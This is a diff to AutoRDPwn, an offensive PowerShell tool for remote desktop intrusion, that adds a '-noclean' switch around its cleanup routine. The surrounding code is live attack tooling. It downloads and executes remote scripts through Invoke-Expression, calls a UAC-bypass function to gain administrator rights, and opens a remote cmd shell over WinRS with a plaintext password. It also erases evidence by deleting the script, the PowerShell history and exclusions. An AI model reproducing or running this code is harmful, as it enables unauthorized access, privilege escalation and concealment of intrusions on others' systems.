@@ -1,5 +1,5 @@
 ﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8") ; $OSVersion = [Environment]::OSVersion.Platform
-$noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] ; $option=$args[4] ; $shadowoption=$args[6] ; $createuser=$args[8] ; if($args[1,2,3,4,5,6]){ if(!$args[7]) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
+$noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] ; $option=$args[4] ; $shadowoption=$args[6] ; $createuser=$args[8] ; $noclean=$args[9] ; if($args[1,2,3,4,5,6]){ if(!$args[7]) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
 if($OSVersion -like 'Win*'){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/AutoBypass.ps1') ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/NinjaStyle.ps1')
 if($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $args " ; exit }}
 (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/AutoRDPwn.ico","$pwd\AutoRDPwn.ico") ; (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Set-ConsoleIcon.ps1","$pwd\Set-ConsoleIcon.ps1") ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
@@ -645,7 +645,8 @@ if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interf
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 } if($tsfail) { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}
 
-Write-Host ; Write-Host $txt75 -ForegroundColor Red ; Start-Sleep -milliseconds 2500
-$sid = (gwmi win32_process | select handle, commandline | findstr "shadow").split("").trim()[0] ; Wait-Process -Id $sid ; if ($attack) { Start-Sleep -milliseconds 2500 ; Write-Host ; Write-Host $txt77 -ForegroundColor Blue ; Start-Sleep -milliseconds 4500 }
+if ($noclean -like '-noclean') { $null } else { Write-Host ; Write-Host $txt75 -ForegroundColor Red ; Start-Sleep -milliseconds 2500
+$sid = (gwmi win32_process | select handle, commandline | findstr "shadow").split("").trim()[0] ; Wait-Process -Id $sid 
+if ($attack) { Start-Sleep -milliseconds 2500 ; Write-Host ; Write-Host $txt77 -ForegroundColor Blue ; Start-Sleep -milliseconds 4500
 $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions 2>&1> $null ; Set-Clipboard $null 2>&1> $null
-Write-Host ; Write-Host $txt76 -ForegroundColor Green ; Start-Sleep -milliseconds 2500
+Write-Host ; Write-Host $txt76 -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }}
